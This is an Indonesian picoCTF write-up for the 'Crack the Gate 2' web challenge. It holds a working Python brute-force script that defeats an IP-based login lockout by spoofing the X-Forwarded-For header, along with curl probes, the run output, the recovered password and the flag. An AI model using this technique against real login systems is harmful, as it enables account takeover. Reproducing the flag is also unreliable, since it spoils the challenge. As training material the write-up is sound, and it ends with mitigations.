# Crack the Gate 2

| Informasi | Detail |
| --- | --- |
| Platform / Event | picoCTF 2026 (via CyLab Security Academy) |
| Kategori | Web Exploitation |
| Tingkat Kesulitan | Medium |
| Status | Solved |

## Deskripsi

Challenge `Crack the Gate 2` adalah varian kedua dari seri "Crack the Gate": sebuah
halaman login yang dilindungi rate limit agresif untuk mencegah brute force password.
Versi ini memperketat lockout-nya dibanding versi pertama. Tujuannya tetap sama:
bypass proteksi rate limit, menemukan password yang benar untuk akun yang disediakan,
dan mendapatkan flag.

## Informasi Awal

- Instance diakses melalui browser dengan URL yang berubah setiap instance:

  ```text
  http://amiable-citadel.picoctf.net:52432/
  ```

- Halaman login berisi form `email` dan `password`. JavaScript di halaman mengirim
  data sebagai JSON ke `POST /login` via `fetch`, dan menampilkan `prompt()` berisi
  flag bila respons `{"success": true, "flag": ...}`.
- Deskripsi challenge menyediakan satu akun target: `ctf-player@picoctf.org`.
- File yang diberikan bersama challenge:
  - `passwords.txt`: 20 kandidat password, format satu password per baris
    (`FvQqRDID`, `o28yxJnz`, dst. — string acak 8 karakter).
- Recon endpoint sederhana: tidak ada halaman register, source, atau robots.txt
  yang terbuka.

## Tools

- Python 3 (urllib, stdlib saja)
- curl (recon dan probing)
- Browser

## Analisis

### Karakter rate limit

Probing awal dengan beberapa POST gagal langsung memicu lockout:

```json
{"success": false, "error": "Too many failed attempts. Please try again in 20 minutes."}
```

dengan HTTP status **429** — lockout 20 menit per IP, jauh lebih ketat dari rate limit
berbasis window seperti di Fool the Lockout. Brute force frontal 20 password tidak
akan muat bila ambang lockout-nya hanya beberapa percobaan.

### Titik lemah: IP dari header yang bisa dikontrol klien

Mengulang request dengan header `X-Forwarded-For` berbeda menghasilkan perilaku baru:

```bash
curl -X POST http://amiable-citadel.picoctf.net:52432/login \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 10.99.99.7" \
  -d '{"email":"ctf-player@picoctf.org","password":"wrong"}'
# -> {"success":false} [200], bukan 429
```

Respons kembali 200 (bukan 429) — artinya server menentukan identitas IP klien dari
header `X-Forwarded-For` yang dikirim klien sendiri. Ini pola umum saat aplikasi
berjalan di balik reverse proxy: kode membaca `X-Forwarded-For` tanpa memvalidasi
bahwa request benar-benar datang dari proxy tepercaya. Konsekuensinya: counter
rate limit per-IP bisa dipisah sesuka hati dengan IP palsu unik per request.

### Rencana serangan

- Untuk tiap password di `passwords.txt`, kirim POST `/login` JSON
  `{"email": "ctf-player@picoctf.org", "password": <kandidat>}`.
- Setiap request memakai `X-Forwarded-For` unik (`10.0.<i/256>.<i%256+1>`) sehingga
  tiap percobaan dihitung untuk "IP" yang berbeda dan lockout tidak pernah terpicu.
- Sukses terdeteksi dari `"success": true` — flag ada langsung di respons JSON.

## Langkah Penyelesaian

### 1. Recon dan probing

Verifikasi respons normal vs lockout, lalu uji apakah XFF mengubah keputusan rate
limiter (dua curl dengan IP palsu berbeda, keduanya 200). Hasil positif ini yang
menentukan seluruh strategi.

### 2. Script brute force dengan XFF unik

```python
import json
import urllib.request

BASE = "http://amiable-citadel.picoctf.net:52432"
PASSWORDS_FILE = "passwords.txt"
EMAIL = "ctf-player@picoctf.org"


def try_login(email, password, fake_ip):
    data = json.dumps({"email": email, "password": password}).encode()
    req = urllib.request.Request(
        BASE + "/login",
        data=data,
        method="POST",
        headers={
            "Content-Type": "application/json",
            "X-Forwarded-For": fake_ip,
        },
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return resp.status, json.loads(resp.read().decode())


for i, pw in enumerate(open(PASSWORDS_FILE).read().split()):
    fake_ip = f"10.0.{i // 256}.{i % 256 + 1}"  # unique per attempt
    status, body = try_login(EMAIL, pw, fake_ip)
    if body.get("success"):
        print(f"[+] SUCCESS: {pw}\n[+] FLAG: {body.get('flag')}")
        break
```

Tidak diperlukan pacing/jeda: setiap request punya "IP" sendiri, jadi counter
server untuk IP asli tidak pernah bertambah.

### 3. Eksekusi

```text
[*] Loaded 20 password candidates
[-] FvQqRDID -> failed
...
[-] y9JoEDYm -> failed
[+] SUCCESS: QKCdmMKy
[+] FLAG: picoCTF{xff_byp4ss_brut3_44b93275}
```

### 4. Konfirmasi di browser

Login manual di halaman web dengan `ctf-player@picoctf.org` / `QKCdmMKy` memunculkan
dialog "Login successful!" berisi flag yang sama.

## Flag

```text
picoCTF{xff_byp4ss_brut3_44b93275}
```

## Pembelajaran

- Rate limit per-IP hanya sekuat metode penentuan IP-nya. Jika server membaca
  `X-Forwarded-For` (atau `X-Real-IP`, `CF-Connecting-IP`, dsb.) tanpa memastikan
  request berasal dari proxy tepercaya, header itu bisa dipalsukan klien.
- Lockout 20 menit terdengar menakutkan, tapi menjadi tidak relevan begitu setiap
  request terlihat berasal dari "IP" berbeda — brute force kembali instan.
- Mitigasi yang benar: hanya percaya header IP dari proxy tepercaya yang dikenal
  (misalnya membaca `request.remote_addr` di level proxy, bukan header dari klien),
  atau kombinasi limit berbasis akun + IP + captcha.
- Probing murah (satu-dua request untuk menguji asumsi) menghemat waktu besar:
  uji `X-Forwarded-For` sebelum menyimpulkan brute force tidak mungkin.

## Referensi

- [picoCTF](https://picoctf.org/)
- [CyLab Security Academy](https://learn.cylabacademy.org/)
- [MDN: X-Forwarded-For header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)
- [OWASP: Credential Stuffing](https://owasp.org/www-community/attacks/Credential_stuffing)
